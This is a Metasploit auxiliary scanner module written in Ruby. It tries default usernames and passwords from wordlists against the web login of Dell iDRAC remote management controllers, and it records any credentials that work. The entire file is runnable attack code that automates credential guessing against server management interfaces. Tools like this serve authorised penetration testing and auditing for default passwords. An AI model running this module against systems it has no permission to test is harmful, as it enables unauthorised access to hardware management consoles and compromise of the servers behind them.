##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Dell iDRAC Default Login',
      'Description' => %q{
        This module attempts to login to a iDRAC webserver instance using
        default username and password.  Tested against Dell Remote Access
        Controller 6 - Express version 1.50 and 1.85
      },
      'Author' =>
        [
          'Cristiano Maruti <cmaruti[at]gmail.com>'
        ],
      'References' =>
        [
          ['CVE', '1999-0502'] # Weak password
        ],
      'License' => MSF_LICENSE
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Path to the iDRAC Administration page', '/data/login']),
      OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
        File.join(Msf::Config.data_directory, "wordlists", "idrac_default_user.txt") ]),
      OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
        File.join(Msf::Config.data_directory, "wordlists", "idrac_default_pass.txt") ]),
      OptInt.new('RPORT', [true, "Default remote port", 443])
    ])

    register_advanced_options([
      OptBool.new('SSL', [true, "Negotiate SSL connection", true])
    ])
  end

  def target_url
    proto = "http"
    if rport == 443 or ssl
      proto = "https"
    end
    uri = normalize_uri(datastore['URI'])
    "#{proto}://#{vhost}:#{rport}#{uri}"
  end

  def do_login(user=nil, pass=nil)

    uri = normalize_uri(target_uri.path)
    auth = send_request_cgi({
      'method' => 'POST',
      'uri' => uri,
      'SSL' => true,
      'vars_post' => {
        'user' => user,
        'password' => pass
      }
    })

    if(auth and auth.body.to_s.match(/<authResult>[0|5]<\/authResult>/) != nil )
      print_good("#{target_url} - SUCCESSFUL login for user '#{user}' with password '#{pass}'")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: (ssl ? 'https' : 'http'),
        user: user,
        password: pass,
        proof: auth.body.to_s
      )
      return :next_user
    else
      print_error("#{target_url} - Dell iDRAC - Failed to login as '#{user}' with password '#{pass}'")
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run_host(ip)
    print_status("Verifying that login page exists at #{ip}")
    uri = normalize_uri(target_uri.path)
    begin
      res = send_request_raw({
        'method' => 'GET',
        'uri' => uri
        })

      if (res and res.code == 200 and res.body.to_s.match(/<authResult>1/) != nil)
        print_status("Attempting authentication")

        each_user_pass { |user, pass|
          do_login(user, pass)
        }

      elsif (res and res.code == 301)
        print_error("#{target_url} - Page redirect to #{res.headers['Location']}")
        return :abort
      else
        print_error("The iDRAC login page does not exist at #{ip}")
        return :abort
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    rescue ::OpenSSL::SSL::SSLError => e
      return if(e.to_s.match(/^SSL_connect /) ) # strange errors / exception if SSL connection aborted
    end
  end
end
